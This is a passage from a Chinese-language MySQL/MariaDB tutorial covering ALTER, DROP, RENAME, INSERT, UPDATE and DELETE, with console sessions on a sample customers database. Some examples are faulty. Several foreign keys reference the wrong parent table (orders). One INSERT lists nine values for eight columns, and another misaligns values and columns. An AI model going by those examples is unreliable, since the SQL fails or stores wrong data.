。原因是希望支持事务处理(因此,使用 InnoDB ),但也需要在 productnotes 中支持全文本搜索(因此,使用 MyISAM )。 外键不能跨引擎 混用引擎类型有一个大缺陷。外键(用于强制实施引用完整性,如第1章所述)不能跨引擎,即使用一个引擎的表不能引用具有使用不同引擎的表的外键。 那么,你应该使用哪个引擎?这有赖于你需要什么样的特性。 MyISAM由于其性能和特性可能是最受欢迎的引擎。但如果你不需要可靠的事务处理,可以使用其他引擎。 更新表 为更新表定义,可使用 ALTER TABLE 语句。但是,理想状态下,当表中存储数据以后,该表就不应该再被更新。在表的设计过程中需要花费大量时间来考虑,以便后期不对该表进行大的改动。 为了使用 ALTER TABLE 更改表结构,必须给出下面的信息: 在 ALTER TABLE 之后给出要更改的表名(该表必须存在,否则将出错); 所做更改的列表。 下面的例子给表添加一个列: 给 vendors 表增加一个名为 vend_phone 的列 123456789101112131415161718MariaDB [test]&gt; alter table vendors add vend_phone char(20);Query OK, 6 rows affected (0.11 sec)Records: 6 Duplicates: 0 Warnings: 0MariaDB [test]&gt; desc vendors;+--------------+----------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+--------------+----------+------+-----+---------+----------------+| vend_id | int(11) | NO | PRI | NULL | auto_increment || vend_name | char(50) | NO | | NULL | || vend_address | char(50) | YES | | NULL | || vend_city | char(50) | YES | | NULL | || vend_state | char(5) | YES | | NULL | || vend_zip | char(10) | YES | | NULL | || vend_country | char(50) | YES | | NULL | || vend_phone | char(20) | YES | | NULL | |+--------------+----------+------+-----+---------+----------------+8 rows in set (0.00 sec) 删除刚刚添加的列vend_phone 1234567891011121314151617MariaDB [test]&gt; alter table vendors drop column vend_phone;Query OK, 6 rows affected (0.12 sec)Records: 6 Duplicates: 0 Warnings: 0MariaDB [test]&gt; desc vendors;+--------------+----------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+--------------+----------+------+-----+---------+----------------+| vend_id | int(11) | NO | PRI | NULL | auto_increment || vend_name | char(50) | NO | | NULL | || vend_address | char(50) | YES | | NULL | || vend_city | char(50) | YES | | NULL | || vend_state | char(5) | YES | | NULL | || vend_zip | char(10) | YES | | NULL | || vend_country | char(50) | YES | | NULL | |+--------------+----------+------+-----+---------+----------------+7 rows in set (0.01 sec) ALTER TABLE 的一种常见用途是定义外键。下面是用来定义讲义中的表所用的外键的代码: 123456789101112131415MariaDB [test]&gt; alter table orderitems -&gt; add constraint fk_orderitems_orders -&gt; foreign key (order_num) references orders (order_num);MariaDB [test]&gt; alter table orderitems -&gt; add constraint fk_orderitems_products -&gt; foreign key (prod_id) references orders (prod_id);MariaDB [test]&gt; alter table orders -&gt; add constraint fk_orderitems_customers -&gt; foreign key (cust_id) references orders (cust_id);MariaDB [test]&gt; alter table products -&gt; add constraint fk_orderitems_vendors -&gt; foreign key (vend_id) references orders (vend_id); 这里,由于要更改4个不同的表,使用了4条 ALTER TABLE 语句。为了对单个表进行多个更改,可以使用单条 ALTER TABLE 语句,每个更改用逗号分隔。 复杂的表结构更改一般需要手动删除过程,它涉及以下步骤: 用新的列布局创建一个新表; 使用 INSERT SELECT 语句从旧表复制数据到新表。如果有必要,可使用转换函数和计算字段; 检验包含所需数据的新表; 重命名旧表(如果确定,可以删除它); 用旧表原来的名字重命名新表; 根据需要,重新创建触发器、存储过程、索引和外键。 小心使用 ALTER TABLE 使用 ALTER TABLE 要极为小心,应该在进行改动前做一个完整的备份(模式和数据的备份)。数据库表的更改不能撤销,如果增加了不需要的列,可能不能删除它们。类似地,如果删除了不应该删除的列,可能会丢失该列中的所有数据。 删除表 删除表(删除整个表而不是其内容)非常简单,使用 DROP TABLE 语句即可: drop table customers2; 12345678910111213141516171819202122232425ariaDB [test]&gt; create table customer2 as select * from customers;Query OK, 15 rows affected (0.08 sec)Records: 15 Duplicates: 0 Warnings: 0MariaDB [test]&gt; select * from customers;+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 10002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 10005 | The Fudds | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 10007 | Pep E. LaPew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 10008 | M. Martian | 42 Galaxy Way | New York | NY | 11213 | USA | NULL | NULL || 20001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 20002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 20003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 20004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 20005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 20006 | Pep E. Lapew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 20007 | Pep E. LaPew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 20008 | M. Martian | 42 Galaxy Way | New York | NY | 11213 | USA | NULL | NULL |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+15 rows in set (0.00 sec) 这条语句删除 customers2 表(假设它存在)也不能撤销,执行这条语句将永久删除该表。 重命名表 使用 RENAME TABLE 语句可以重命名一个表: 12345MariaDB [test]&gt; rename table customers to customers3;Query OK, 0 rows affected (0.05 sec)MariaDB [test]&gt; rename table customers3 to customers;Query OK, 0 rows affected (0.04 sec) RENAME TABLE 所做的仅是重命名一个表。可以使用下面的语句对多个表重命名: 12345MariaDB [test]&gt; rename table vendors to vendors0,products to products0,orders to orders0;Query OK, 0 rows affected (0.08 sec)MariaDB [test]&gt; rename table vendors0 to vendors,products0 to products,orders0 to orders;Query OK, 0 rows affected (0.06 sec) 小结 本章介绍了几条新SQL语句。 CREATE TABLE 用来创建新表, ALTER TABLE 用来更改表列(或其他诸如约束或索引等对象),而 DROP TABLE 用来完整地删除一个表。这些语句必须小心使用,并且应在做了备份后使用。本章还介绍了数据库引擎、定义主键和外键,以及其他重要的表和列选项。 DML语言DML(Data Manipulation Language)语句:数据操纵语句,用于添加、删除、更新和查询数据库记录,并检查数据完整性,常用的语句关键字主要包括 insert、delete、udpate 和select 等。 插入数据本章介绍如何利用SQL的 INSERT 语句将数据插入表中。 数据插入 顾名思义, INSERT 是用来插入(或添加)行到数据库表的。插入可以用几种方式使用: 插入完整的行; 插入行的一部分; 插入多行; 插入某些查询的结果。 下面将介绍这些内容。 插入及系统安全 可针对每个表或每个用户,利用MySQL的安全机制禁止使用 INSERT 语句。 插入完整的行 把数据插入表中的最简单的方法是使用基本的 INSERT 语法,它要求指定表名和被插入到新行中的值。下面举一个例子: 123456789101112131415MariaDB [test]&gt; insert into customers values(null,&apos;Pep E. Lapew&apos;,&apos;100 Main Street&apos;,&apos;Los Angeles&apos;,&apos;CA&apos;,&apos;90046&apos;,&apos;USA&apos;,null,null);Query OK, 1 row affected (0.02 sec)MariaDB [test]&gt; select * from customers;+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 10002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 10006 | Pep E. Lapew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+6 rows in set (0.00 sec) 没有输出 INSERT 语句一般不会产生输出。 此例子插入一个新客户到 customers 表。存储到每个表列中的数据在 VALUES 子句中给出,对每个列必须提供一个值。如果某个列没有值(如上面的 cust_contact 和 cust_email 列),应该使用 NULL值(假定表允许对该列指定空值)。各个列必须以它们在表定义中出现的次序填充。第一列 cust_id 也为 NULL 。这是因为每次插入一个新行时,该列由MySQL自动增量。你不想给出一个值(这是MySQL的工作),又不能省略此列(如前所述,必须给出每个列),所以指定一个 NULL 值(它被MySQL忽略,MySQL在这里插入下一个可用的 cust_id值)。 虽然这种语法很简单,但并不安全,应该尽量避免使用。上面的SQL语句高度依赖于表中列的定义次序,并且还依赖于其次序容易获得的信息。即使可得到这种次序信息,也不能保证下一次表结构变动后各个列保持完全相同的次序。因此,编写依赖于特定列次序的SQL语句是很不安全的。如果这样做,有时难免会出问题。 编写 INSERT 语句的更安全(不过更烦琐)的方法如下: 12MariaDB [test]&gt; insert into customers(cust_name,cust_address,cust_city,cust_state,cust_zip,cust_country,cust_contact,cust_email) -&gt; values (null,&apos;Pep E. Lapew&apos;,&apos;100 Main Street&apos;,&apos;Los Angeles&apos;,&apos;CA&apos;,&apos;90046&apos;,&apos;USA&apos;,null,null); 此例子完成与前一个 INSERT 语句完全相同的工作,但在表名后的括号里明确地给出了列名。在插入行时,MySQL将用 VALUES列表中的相应值填入列表中的对应项。 VALUES 中的第一个值对应于第一个指定的列名。第二个值对应于第二个列名,如此等等。 因为提供了列名, VALUES 必须以其指定的次序匹配指定的列名,不一定按各个列出现在实际表中的次序。其优点是,即使表的结构改变,此 INSERT 语句仍然能正确工作。你会发现 cust_id 的NULL 值是不必要的,cust_id 列并没有出现在列表中,所以不需要任何值。下面的 INSERT 语句填充所有列(与前面的一样),但以一种不同的次序填充。因为给出了列名,所以插入结果仍然正确: 12MariaDB [test]&gt; insert into customers(cust_contact,cust_email,cust_address,cust_city,cust_state,cust_zip,cust_country) -&gt; values (&apos;Pep E. Lapew&apos;,null,null,&apos;100 Main Street&apos;,&apos;Los Angeles&apos;,&apos;CA&apos;,&apos;90046&apos;,&apos;USA&apos;); 总是使用列的列表 一般不要使用没有明确给出列的列表的INSERT 语句。使用列的列表能使SQL代码继续发挥作用,即使表结构发生了变化。 仔细地给出值 不管使用哪种 INSERT 语法,都必须给出VALUES 的正确数目。如果不提供列名,则必须给每个表列提供一个值。如果提供列名,则必须对每个列出的列给出一个值。如果不这样,将产生一条错误消息,相应的行插入不成功。 使用这种语法,还可以省略列。这表示可以只给某些列提供值,给其他列不提供值。 (事实上你已经看到过这样的例子:当列名被明确列出时, cust_id 可以省略) 省略列 如果表的定义允许,则可以在 INSERT 操作中省略某些列。省略的列必须满足以下某个条件。 该列定义为允许 NULL 值(无值或空值)。 在表定义中给出默认值。这表示如果不给出值,将使用默认值。 如果对表中不允许 NULL 值且没有默认值的列不给出值,则MySQL将产生一条错误消息,并且相应的行插入不成功。 提高整体性能 数据库经常被多个客户访问,对处理什么请求以及用什么次序处理进行管理是MySQL的任务。 INSERT 操作可能很耗时(特别是有很多索引需要更新时),而且它可能降低等待处理的 SELECT 语句的性能。 如果数据检索是最重要的(通常是这样),则你可以通过在INSERT 和 INTO 之间添加关键字 LOW_PRIORITY ,指示MySQL降低 INSERT 语句的优先级,如下所示:insert low_priority into顺便说一下,这也适用于下一章介绍的 UPDATE 和 DELETE 语句。 插入多个行 INSERT 可以插入一行到一个表中。但如果你想插入多个行怎么办? 可以使用多条 INSERT 语句,甚至一次提交它们,每条语句用一个分号结束,或者,只要每条 INSERT 语句中的列名(和次序)相同,可以如下组合各语句: 12345678910111213141516171819MariaDB [test]&gt; insert into customers (cust_name,cust_address,cust_city,cust_state,cust_zip,cust_country) -&gt; values (&apos;Pep E. LaPew&apos;,&apos;100 Main Street&apos;,&apos;Los Angeles&apos;,&apos;CA&apos;,&apos;90046&apos;,&apos;USA&apos;), -&gt; (&apos;M. Martian&apos;,&apos;42 Galaxy Way&apos;,&apos;New York&apos;,&apos;NY&apos;,&apos;11213&apos;,&apos;USA&apos;);Query OK, 2 rows affected (0.05 sec)Records: 2 Duplicates: 0 Warnings: 0MariaDB [test]&gt; select * from customers;+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 10002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 10006 | Pep E. Lapew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 10007 | Pep E. LaPew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 10008 | M. Martian | 42 Galaxy Way | New York | NY | 11213 | USA | NULL | NULL |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+ 其中单条 INSERT 语句有多组值,每组值用一对圆括号括起来,用逗号分隔。 提高 INSERT 的性能 此技术可以提高数据库处理的性能,因为MySQL用单条 INSERT 语句处理多个插入比使用多条 INSERT语句快。 插入检索出的数据 INSERT 一般用来给表插入一个指定列值的行。但是, INSERT 还存在另一种形式,可以利用它将一条 SELECT 语句的结果插入表中。这就是所谓的 INSERT SELECT ,顾名思义,它是由一条 INSERT 语句和一条 SELECT语句组成的。 假如你想从另一表中合并客户列表到你的 customers 表。不需要每次读取一行,然后再将它用 INSERT 插入,可以如下进行: 新例子的说明 这个例子把一个名为 custnew 的表中的数据导入 customers 表中。为了试验这个例子,应该首先创建和填充 custnew 表。 custnew 表的结构与附录B中描述的 customers表的相同。在填充 custnew 时,不应该使用已经在 customers中使用过的 cust_id 值(如果主键值重复,后续的 INSERT 操作将会失败)或仅省略这列值让MySQL在导入数据的过程中产生新值。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141MariaDB [test]&gt; create table custnew as select * from customers;Query OK, 8 rows affected (0.33 sec)Records: 8 Duplicates: 0 Warnings: 0MariaDB [test]&gt; select * from custnew;+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 10002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 10006 | Pep E. Lapew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 10007 | Pep E. LaPew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 10008 | M. Martian | 42 Galaxy Way | New York | NY | 11213 | USA | NULL | NULL |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+8 rows in set (0.00 sec)MariaDB [test]&gt; desc custnew;+--------------+-----------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+--------------+-----------+------+-----+---------+-------+| cust_id | int(11) | NO | | 0 | || cust_name | char(50) | NO | | NULL | || cust_address | char(50) | YES | | NULL | || cust_city | char(50) | YES | | NULL | || cust_state | char(5) | YES | | NULL | || cust_zip | char(10) | YES | | NULL | || cust_country | char(50) | YES | | NULL | || cust_contact | char(50) | YES | | NULL | || cust_email | char(255) | YES | | NULL | |+--------------+-----------+------+-----+---------+-------+9 rows in set (0.00 sec)MariaDB [test]&gt; desc customers;+--------------+-----------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+--------------+-----------+------+-----+---------+----------------+| cust_id | int(11) | NO | PRI | NULL | auto_increment || cust_name | char(50) | NO | | NULL | || cust_address | char(50) | YES | | NULL | || cust_city | char(50) | YES | | NULL | || cust_state | char(5) | YES | | NULL | || cust_zip | char(10) | YES | | NULL | || cust_country | char(50) | YES | | NULL | || cust_contact | char(50) | YES | | NULL | || cust_email | char(255) | YES | | NULL | |+--------------+-----------+------+-----+---------+----------------+9 rows in set (0.00 sec)MariaDB [test]&gt; select * from custnew;+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 10002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 10006 | Pep E. Lapew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 10007 | Pep E. LaPew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 10008 | M. Martian | 42 Galaxy Way | New York | NY | 11213 | USA | NULL | NULL |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+8 rows in set (0.00 sec)MariaDB [test]&gt; update custnew set cust_id=20001 where cust_id=10001;Query OK, 1 row affected (0.04 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [test]&gt; update custnew set cust_id=20002 where cust_id=10002;Query OK, 1 row affected (0.05 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [test]&gt; update custnew set cust_id=20003 where cust_id=10003;Query OK, 1 row affected (0.04 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [test]&gt; update custnew set cust_id=20004 where cust_id=10004;Query OK, 1 row affected (0.04 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [test]&gt; update custnew set cust_id=20005 where cust_id=10005;Query OK, 1 row affected (0.04 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [test]&gt; update custnew set cust_id=20006 where cust_id=10006;Query OK, 1 row affected (0.04 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [test]&gt; update custnew set cust_id=20007 where cust_id=10007;Query OK, 1 row affected (0.05 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [test]&gt; update custnew set cust_id=20008 where cust_id=10008;Query OK, 1 row affected (0.04 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [test]&gt; select * from custnew;+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| 20001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 20002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 20003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 20004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 20005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 20006 | Pep E. Lapew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 20007 | Pep E. LaPew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 20008 | M. Martian | 42 Galaxy Way | New York | NY | 11213 | USA | NULL | NULL |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+8 rows in set (0.00 sec)# 将custnew表中的数据导入customers表MariaDB [test]&gt; insert into customers select * from custnew;Query OK, 8 rows affected (0.06 sec)Records: 8 Duplicates: 0 Warnings: 0MariaDB [test]&gt; select * from customers;+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 10002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 10006 | Pep E. Lapew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 10007 | Pep E. LaPew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 10008 | M. Martian | 42 Galaxy Way | New York | NY | 11213 | USA | NULL | NULL || 20001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 20002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 20003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 20004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 20005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 20006 | Pep E. Lapew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 20007 | Pep E. LaPew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 20008 | M. Martian | 42 Galaxy Way | New York | NY | 11213 | USA | NULL | NULL |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+16 rows in set (0.00 sec) 这个例子使用 INSERT SELECT 从 custnew 中将所有数据导入customers 。 SELECT 语句从 custnew 检索出要插入的值,而不是列出它们。 SELECT 中列出的每个列对应于 customers 表名后所跟的列表中的每个列。这条语句将插入多少行有赖于 custnew 表中有多少行。如果这个表为空,则没有行被插入(也不产生错误,因为操作仍然是合法的)。如果这个表确实含有数据,则所有数据将被插入到 customers 。 这个例子导入了 cust_id (假设你能够确保 cust_id 的值不重复)。你也可以简单地省略这列(从 INSERT 和 SELECT 中),这样MySQL就会生成新值。 INSERT SELECT 中的列名 为简单起见,这个例子在 INSERT 和 SELECT 语句中使用了相同的列名。但是,不一定要求列名匹配。事实上,MySQL甚至不关心 SELECT 返回的列名。它使用的是列的位置,因此 SELECT 中的第一列(不管其列名)将用来填充表列中指定的第一个列,第二列将用来填充表列中指定的第二个列,如此等等。这对于从使用不同列名的表中导入数据是非常有用的。 INSERT SELECT 中 SELECT 语句可包含 WHERE 子句以过滤插入的数据。 小结 本章介绍如何将行插入到数据库表。我们学习了使用 INSERT 的几种方法,以及为什么要明确使用列名,学习了如何用 INSERT SELECT 从其他表中导入行。下一章讲述如何使用 UPDATE 和 DELETE 进一步操纵表数据。 更新和删除数据本章介绍如何利用 UPDATE 和 DELETE 语句进一步操纵表数据。 更新数据 为了更新(修改)表中的数据,可使用 UPDATE 语句。可采用两种方式使用 UPDATE : 更新表中特定行; 更新表中所有行。 下面分别对它们进行介绍。 不要省略 WHERE 子句 在使用 UPDATE 时一定要注意细心。因为稍不注意,就会更新表中所有行。在使用这条语句前,请完整地阅读本节。 UPDATE 与安全 可以限制和控制 UPDATE 语句的使用 UPDATE 语句非常容易使用,甚至可以说是太容易使用了。基本的UPDATE 语句由3部分组成,分别是: 要更新的表; 列名和它们的新值; 确定要更新行的过滤条件。 举一个简单例子。 客户cust_id=10005 现在有了电子邮件地址elmer@fudd.com,因此他的记录需要更新,语句如下: 1234567891011MariaDB [test]&gt; update customers set cust_email = &apos;elmer@fudd.com&apos; where cust_id = 10005;Query OK, 1 row affected (0.05 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [test]&gt; select cust_email from customers where cust_id =10005;+----------------+| cust_email |+----------------+| elmer@fudd.com |+----------------+1 row in set (0.00 sec) UPDATE 语句总是以要更新的表的名字开始。在此例子中,要更新的表的名字为 customers 。 SET 命令用来将新值赋给被更新的列。如这里所示, SET 子句设置 cust_email 列为指定的值:set cust_email = &apos;elmer@fudd.com&apos; UPDATE语句以 WHERE 子句结束,它告诉MySQL更新哪一行。没有WHERE 子句,MySQL将会用这个电子邮件地址更新 customers 表中所有行,这不是我们所希望的。 更新多个列的语法稍有不同: 1234567891011MariaDB [test]&gt; update customers set cust_name = &apos;The Fudds&apos;,cust_email = &apos;elmer@fudd.com&apos; where cust_id = 10005;Query OK, 1 row affected (0.05 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [test]&gt; select * from customers where cust_id =10005;+---------+-----------+------------------+-----------+------------+----------+--------------+--------------+----------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+---------+-----------+------------------+-----------+------------+----------+--------------+--------------+----------------+| 10005 | The Fudds | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | elmer@fudd.com |+---------+-----------+------------------+-----------+------------+----------+--------------+--------------+----------------+1 row in set (0.00 sec) 在更新多个列时,只需要使用单个SET 命令,每个“列=值”对之间用逗号分隔(最后一列之后不用逗号)。在此例子中,更新客户 10005 的cust_name 和 cust_email 列。 在 UPDATE 语句中使用子查询 UPDATE 语句中可以使用子查询,使得能用 SELECT 语句检索出的数据更新列数据。 IGNORE 关键字 如果用 UPDATE 语句更新多行,并且在更新这些行中的一行或多行时出一个现错误,则整个 UPDATE 操作被取消(错误发生前更新的所有行被恢复到它们原来的值)。为即使是发生错误,也继续进行更新,可使用 IGNORE 关键字,如下所示:UPDATE IGNORE customers... 为了删除某个列的值,可设置它为 NULL (假如表定义允许 NULL 值)。 1234567891011MariaDB [test]&gt; update customers set cust_email = null where cust_id = 10005;Query OK, 1 row affected (0.05 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [test]&gt; select * from customers where cust_id =10005;+---------+-----------+------------------+-----------+------------+----------+--------------+--------------+------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+---------+-----------+------------------+-----------+------------+----------+--------------+--------------+------------+| 10005 | The Fudds | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL |+---------+-----------+------------------+-----------+------------+----------+--------------+--------------+------------+1 row in set (0.00 sec) 其中 NULL 用来去除 cust_email 列中的值。 删除数据 为了从一个表中删除(去掉)数据,使用 DELETE 语句。可以两种方式使用 DELETE : 从表中删除特定的行; 从表中删除所有行。 下面分别对它们进行介绍。 不要省略 WHERE 子句 在使用 DELETE 时一定要注意细心。因为稍不注意,就会错误地删除表中所有行。在使用这条语句前,请完整地阅读本节。 DELETE 与安全 可以限制和控制 DELETE 语句的使用 前面说过, UPDATE 非常容易使用,而 DELETE 更容易使用。下面的语句从 customers 表中删除一行: 只删除客户 10006 123456789101112131415161718192021222324MariaDB [test]&gt; delete from customers where cust_id = 10006;Query OK, 1 row affected (0.04 sec)MariaDB [test]&gt; select * from customers;+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+| 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 10002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 10005 | The Fudds | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 10007 | Pep E. LaPew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 10008 | M. Martian | 42 Galaxy Way | New York | NY | 11213 | USA | NULL | NULL || 20001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 20002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 20003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | 